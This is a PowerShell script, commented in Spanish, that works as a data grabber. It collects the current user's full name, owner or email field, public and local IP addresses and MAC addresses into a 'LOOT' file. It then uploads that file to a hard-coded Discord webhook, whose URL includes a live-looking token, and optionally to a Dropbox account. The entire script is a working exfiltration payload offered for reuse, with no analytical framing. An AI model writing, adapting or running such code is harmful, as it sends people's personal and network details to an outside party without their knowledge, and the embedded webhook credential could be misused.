# Define la URL del script en GitHub
$dc = 'https://discord.com/api/webhooks/1264728039682740356/RjUIrKfIKnpBH3npIAWT-M7YZ0KfwCzVmkgGp8yF2Bv3hagAgVVdSucimNeswCoiStR3'
$db = '' # Agrega tu token de Dropbox aquí

$FileName = "$env:TEMP\$env:USERNAME-LOOT-$(Get-Date -Format yyyy-MM-dd_hh-mm).txt"

#------------------------------------------------------------------------------------------------------------------------------------

function Get-FullName {
    try {
        $fullName = (Get-LocalUser -Name $env:USERNAME).FullName
    } catch {
        Write-Error "No name was detected"
        return $env:USERNAME
    }
    return $fullName
}

$fullName = Get-FullName

#------------------------------------------------------------------------------------------------------------------------------------

function Get-Email {
    try {
        $email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
    } catch {
        Write-Error "An email was not found"
        return "No Email Detected"
    }
    return $email
}

$email = Get-Email

#------------------------------------------------------------------------------------------------------------------------------------

try {
    $computerPubIP = (Invoke-WebRequest -Uri "https://ipinfo.io/ip").Content
} catch {
    $computerPubIP = "Error getting Public IP"
}

$localIP = Get-NetIPAddress -InterfaceAlias "*Ethernet*", "*Wi-Fi*" -AddressFamily IPv4 | Select-Object InterfaceAlias, IPAddress, PrefixOrigin | Out-String

$MAC = Get-NetAdapter -Name "*Ethernet*", "*Wi-Fi*" | Select-Object Name, MacAddress, Status | Out-String

#------------------------------------------------------------------------------------------------------------------------------------

$output = @"
Full Name: $fullName

Email: $email

------------------------------------------------------------------------------------------------------------------------------
Public IP:
$computerPubIP

Local IPs:
$localIP

MAC:
$MAC
"@

$output | Out-File -FilePath $FileName

#------------------------------------------------------------------------------------------------------------------------------------

function Upload-Discord {
    [CmdletBinding()]
    param (
        [string]$file,
        [string]$text
    )

    $hookurl = $dc

    $Body = @{
        'username' = $env:USERNAME
        'content' = $text
    }

    if (-not [string]::IsNullOrEmpty($text)) {
        Invoke-RestMethod -ContentType 'application/json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not [string]::IsNullOrEmpty($file)) {
        $fileContent = [System.IO.File]::ReadAllBytes($file)
        $boundary = [System.Guid]::NewGuid().ToString()
        $fileContentString = [System.Text.Encoding]::UTF8.GetString($fileContent)
        $content = "--$boundary`r`nContent-Disposition: form-data; name=`"file1`"; filename=`"$([System.IO.Path]::GetFileName($file))`"`r`nContent-Type: application/octet-stream`r`n`r`n$fileContentString`r`n--$boundary--`r`n"
        $headers = @{
            "Content-Type" = "multipart/form-data; boundary=$boundary"
        }
        Invoke-RestMethod -Uri $hookurl -Method Post -Body $content -Headers $headers
    }
}

if (-not [string]::IsNullOrEmpty($dc)) { Upload-Discord -file $FileName }

#------------------------------------------------------------------------------------------------------------------------------------

function DropBox-Upload {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [Alias("f")]
        [string]$SourceFilePath
    )

    $outputFile = [System.IO.Path]::GetFileName($SourceFilePath)
    $TargetFilePath = "/$outputFile"
    $arg = "{`"path`": `"$TargetFilePath`", `"mode`": `"add`", `"autorename`": true, `"mute`": false }"
    $authorization = "Bearer " + $db
    $headers = @{
        "Authorization" = $authorization
        "Dropbox-API-Arg" = $arg
        "Content-Type" = 'application/octet-stream'
    }
    Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method Post -InFile $SourceFilePath -Headers $headers
}

if (-not [string]::IsNullOrEmpty($db)) { DropBox-Upload -SourceFilePath $FileName }
